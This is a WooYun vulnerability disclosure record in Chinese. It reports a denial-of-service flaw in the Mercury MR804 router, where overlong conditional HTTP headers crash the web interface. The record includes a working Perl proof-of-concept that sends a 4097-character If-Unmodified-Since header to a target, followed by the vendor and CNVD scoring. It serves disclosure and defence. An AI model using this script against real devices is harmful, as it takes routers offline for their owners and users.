{"id": 19377, "wybug_id": "wooyun-2012-07190", "wybug_title": "Mercury MR804拒绝服务漏洞", "wybug_corp": "深圳市美科星通讯技术有限公司", "wybug_author": "demonalex", "wybug_date": "2012-05-16 15:01", "wybug_open_date": "2012-06-30 15:01", "wybug_type": "设计不当", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程拒绝服务", "路由器安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-05-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2012-07-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-06-30：\t细节向公众公开  简要描述： Mercury MR804是一款小型路由器产品。Mercury MR804（Hardware Version : MR804 v8.0 081C3113，Software Version : 3.8.1 Build 101220 Rel.53006nB）在处理HTTP标头时存在安全漏洞，可通过特制的HTTP标头造成设备停止响应。 详细说明：  Mercury MR804的HTTP/WEB管理接口（TCP80）在接收到“在HTTP头中If-Modified-Since、If-None-Match、If-Unmodified-Since等字段的值过长（大于或等于4097个字符）”的HTTP请求时，将立刻崩溃，必须要重启硬件设备方可恢复。   漏洞证明：  POC:#-------------------------------------------------------------#!/usr/bin/perl -wuse Socket;$|=1;print '*********************************'.\"\\n\";print '* mercurycom MR804 v8.0 DoS PoC *'.\"\\n\";print '*  writed by demonalex@163.com  *'.\"\\n\";print '*********************************'.\"\\n\";$evil='A'x4097;$test_ip=shift;                           #target ip$test_port=shift;                         #target portif(!defined($test_ip) || !defined($test_port)){\tdie \"usage : $0 target_ip target_port\\n\";}$test_payload=\"GET / HTTP/1.0\\r\\n\".\"Accept: */*\\r\\n\".\"Accept-Language: zh-cn\\r\\n\".\"UA-CPU: x86\\r\\n\".\"If-Unmodified-Since: \".$evil.\"\\r\\n\".\"Accept-Encoding: gzip, deflate\\r\\n\".\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322;\".\" .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; 360SE)\\r\\n\".\"Host: \".$test_ip.\"\\r\\n\".\"Connection: Keep-Alive\".\"\\r\\n\\r\\n\";$test_target=inet_aton($test_ip);$test_target=sockaddr_in($test_port, $test_target);socket(SOCK, AF_INET, SOCK_STREAM, 6) || die \"cannot create socket!\\n\";connect(SOCK, $test_target) || die \"cannot connect the target!\\n\";send(SOCK, $test_payload, 0) || die \"cannot send the payload!\\n\";#recv(SOCK, $test_payload, 100, 0);close(SOCK);print \"done!\\n\";exit(1);#-------------------------------------------------------------   修复方案：  目前厂商还没有提供补丁或者升级程序。   版权声明：转载请注明来源 demonalex@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-05-21 00:19 厂商回复： CNVD根据P.o.c确认漏洞，暂未复现情况，转由CNCERT协调厂商处置。对漏洞评分如下：CVSS：(AV:R/AC:L/Au:NR/C:N/A:C/I:N/B:N) score:7.79（最高10分，高危）即：远程攻击、攻击难度低、不需要用户认证，对可用性造成完全影响。技术难度系数：1.2（远程拒绝服务类，如果是远程溢出类权值可以更高）影响危害系数：1.1（一般，终端用户产品）CNVD综合评分：7.79*1.2*1.1=10.283 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-16 15:15 |    \t\tLee \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | wataru@eviloctal.com)\t\t \n  希望有足够详细的分析 关注之    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}